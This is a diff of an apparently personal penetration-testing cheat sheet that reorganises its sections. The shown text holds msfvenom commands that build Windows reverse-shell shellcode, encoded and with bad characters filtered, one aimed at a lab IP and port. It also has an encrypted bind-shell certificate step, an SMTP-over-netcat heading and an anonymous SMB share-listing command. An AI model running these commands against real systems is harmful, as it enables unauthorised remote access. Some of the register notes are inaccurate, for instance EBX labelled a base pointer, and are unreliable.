@@ -1,40 +1,3 @@
-# RESOURCES
-## buffer overflow
-#### x86 cheat sheet
-https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
-
-#### registers
-##### ESP - Stack Pointer
-**STACK** keeps track of most recently referenced location (top) of the stack, stores pointer to it
-
-##### EBP - Base Pointer
-**STACK** points to the top of the stack when a function is called, used by a function to access information from its own stack frame
-
-##### EIP - Instruction Pointer
-points to the next code instruction to be executed, directs the flow of a program
-
-##### EAX - Accumulator Register
-used for arithmetic, interrupt calls, logical instructions
-
-##### EBX - Base Pointer
-used as a pointer for memory access
-
-##### ECX - Counter Register
-used as loop counter
-
-##### EDX - Data Register
-used in I/O port access, arithmetic
-
-##### ESI - Source Index
-used for string and array copying
-
-##### EDI - Destination Index Register
-pointer addressing data and destination in string/array copying
-
-#### MSFVenom
-```
-msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "BYTES_GO_here"
-```
 
 # COMMANDS
 ## netcat
@@ -82,6 +45,14 @@ target
 #### encrypted bind shells
 create self-signed certificate
 `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
+
+
+## MSFVenom
+
+#### shell generation - bytes
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "BYTES_GO_here"
+```
 
 
 ## windows
@@ -163,7 +134,7 @@ generate shellcode, filtering out bad characters
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
 
 
-### smtp > netcat
+### email w/ smtp > netcat
 
 smtp file contents:
 ```
@@ -191,3 +162,37 @@ QUIT
 
 #### anonymous/fake login - list shares
 cme smb 10.10.11.152 -u 'anon' -p '' --shares 
+
+
+# RESOURCES
+## buffer overflow
+#### x86 cheat sheet
+https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
+
+#### registers
+##### ESP - Stack Pointer
+**STACK** keeps track of most recently referenced location (top) of the stack, stores pointer to it
+
+##### EBP - Base Pointer
+**STACK** points to the top of the stack when a function is called, used by a function to access information from its own stack frame
+
+##### EIP - Instruction Pointer
+points to the next code instruction to be executed, directs the flow of a program
+
+##### EAX - Accumulator Register
+used for arithmetic, interrupt calls, logical instructions
+
+##### EBX - Base Pointer
+used as a pointer for memory access
+
+##### ECX - Counter Register
+used as loop counter
+
+##### EDX - Data Register
+used in I/O port access, arithmetic
+
+##### ESI - Source Index
+used for string and array copying
+
+##### EDI - Destination Index Register
+pointer addressing data and destination in string/array copying
